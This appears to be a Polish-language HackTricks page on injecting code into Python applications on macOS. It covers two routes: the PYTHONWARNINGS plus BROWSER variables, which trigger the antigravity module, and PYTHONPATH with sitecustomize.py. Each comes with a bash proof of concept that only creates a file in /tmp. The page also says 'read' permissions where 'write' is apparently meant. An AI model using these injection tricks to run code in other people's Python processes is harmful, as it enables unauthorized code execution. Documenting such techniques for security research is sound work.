# Wstrzykiwanie do aplikacji Python w systemie macOS

{{#include ../../../banners/hacktricks-training.md}}

## Za pomocą zmiennych środowiskowych `PYTHONWARNINGS` i `BROWSER`

Jeśli attacker może kontrolować środowisko procesu Python, połączenie `PYTHONWARNINGS` i `BROWSER` może wywołać wykonanie polecenia, gdy Python importuje moduł `antigravity` podczas przetwarzania spreparowanej opcji ostrzeżenia. Technika ta polega na otwieraniu przez `antigravity` adresu URL za pomocą modułu `webbrowser` języka Python, który respektuje zmienną środowiskową `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Przez `PYTHONPATH` i `sitecustomize.py`

Podczas normalnego uruchamiania moduł Python `site` dodaje ścieżki specyficzne dla site, a następnie próbuje zaimportować moduł o nazwie `sitecustomize`. Umieszczając na początku `PYTHONPATH` katalog, do którego attacker ma uprawnienia odczytu, attacker kontrolujący środowisko procesu może sprawić, że Python zaimportuje payload przed skryptem docelowym. Flaga `-S` wyłącza automatyczną inicjalizację `site`, natomiast tryb izolowany (`-I`) ignoruje `PYTHONPATH` i implikuje `-s` oraz `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Hacking z użyciem zmiennych środowiskowych - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook konfiguracji specyficznej dla witryny](https://docs.python.org/3/library/site.html)
- [3] [Wiersz poleceń i środowisko Python](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
